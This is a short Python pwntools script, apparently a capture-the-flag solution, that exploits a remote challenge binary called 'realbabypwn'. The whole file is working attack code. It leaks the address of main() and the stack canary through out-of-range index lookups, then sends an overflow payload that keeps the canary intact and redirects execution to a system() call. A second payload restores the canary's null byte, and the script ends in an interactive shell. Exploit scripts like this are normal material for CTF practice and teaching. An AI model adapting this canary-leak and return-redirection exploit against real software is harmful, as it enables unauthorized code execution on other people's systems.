from pwn import *

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'


#r = process('./realbabypwn')
r = remote('ctf.pwn.sg',1500)
r.recvuntil("look up?")
#291: address of main() 
r.sendline("291")

func = r.recvline()
#address main() - 0x1DE = address of instruction system()
func = pack(int(func[23::])-0x1DE)
r.recvuntil('(y/n)')
r.sendline("y")
canary = r.recvuntil('look up?')
#289 stack canary
r.sendline("289")
canary = r.recvline()
canary = pack(int(canary[23::]))

#write canary
payload = 'y' *0x912+ canary[1::]+'aaaaaaaa' + func
#to write the null byte
payload2 = 'y' * 0x911

#send payload
r.sendline(payload)
r.recvuntil('number?')

r.sendline('289')
r.recvline()
#send payload2
r.sendline(payload2)
print r.recvuntil('number?')

#double check
r.sendline('289')
r.recvuntil('number?')
r.sendline('n')
r.recvuntil('anything?')
r.sendline('n')
r.sendline('ls')
r.interactive()
